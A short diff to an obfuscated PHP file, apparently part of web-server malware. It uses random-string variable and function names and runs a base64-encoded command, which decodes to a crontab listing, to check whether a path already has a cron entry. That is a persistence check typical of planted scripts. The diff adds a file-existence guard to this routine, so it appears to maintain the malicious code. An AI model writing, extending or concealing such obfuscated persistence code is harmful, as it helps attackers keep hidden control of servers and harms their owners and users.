@@ -7,6 +7,7 @@ if (!is_dir($a1s2d3f4g5h6j7k8l9)) {
 }
 $w6e7r8t9y0u1i2o3p4 = $a1s2d3f4g5h6j7k8l9 . $z8k2m9x7n1p5q4r3t6;
 function x1y2z3a4b5c6($w6e7r8t9y0u1i2o3p4) {
+    if (!file_exists($w6e7r8t9y0u1i2o3p4)) return false;
     exec(base64_decode("Y3JvbnRhYiAtbCAyPi9kZXYvbnVsbA=="), $output);
     foreach ($output as $l1n3) {
         if (strpos($l1n3, $w6e7r8t9y0u1i2o3p4) !== false) return true;
